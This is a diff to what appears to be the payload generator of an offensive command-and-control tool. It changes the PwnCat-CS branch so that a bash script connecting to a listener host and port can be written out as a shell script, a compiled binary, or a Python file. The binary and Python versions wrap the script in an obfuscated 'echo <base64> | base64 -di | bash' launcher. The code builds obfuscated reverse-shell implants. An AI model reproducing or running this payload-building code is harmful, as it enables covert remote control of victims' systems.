@@ -149,11 +149,7 @@ def generate_payload(app, tail, file_format, listener_name):
             compiler.compile_dll_file(dst_file)
 
     elif tail == "PwnCat-CS":
-        if file_format == "Bash":
-            dst_name = "PwnCat_" + str(listener_port) + ".sh"
-            dst_file = os.path.join(payloads_dir, dst_name.lower())
-
-            content = f"""#!/bin/bash
+        content = f"""#!/bin/bash
 
 HOST={listener_host}
 PORT={listener_port}
@@ -203,8 +199,25 @@ while true; do
     done
 done
 """
-
+        if file_format == "Bash":
+            dst_name = "PwnCat_" + str(listener_port) + ".sh"
+            dst_file = os.path.join(payloads_dir, dst_name.lower())        
             with open(dst_file, 'w') as file:
                 file.write(content)
+
+        if file_format == "Binary":
+            dst_name = "PwnCat_" + str(listener_port)
+            dst_file = os.path.join(payloads_dir, dst_name.lower())        
+            payload = str(base64.b64encode(content.encode('utf8')).decode())
+            content = "echo " + payload + " | base64 -di | bash"
+            compiler.create_c_file(content, dst_file, "bin")
+            compiler.compile_bin_file(dst_file)
+
+        if file_format == "Python 3":
+            dst_name = "PwnCat_" + str(listener_port) + ".py"
+            dst_file = os.path.join(payloads_dir, dst_name.lower())        
+            payload = str(base64.b64encode(content.encode('utf8')).decode())
+            content = "echo " + payload + " | base64 -di | bash"
+            compiler.create_py_file(content, dst_file)
 
     app.generate_success()
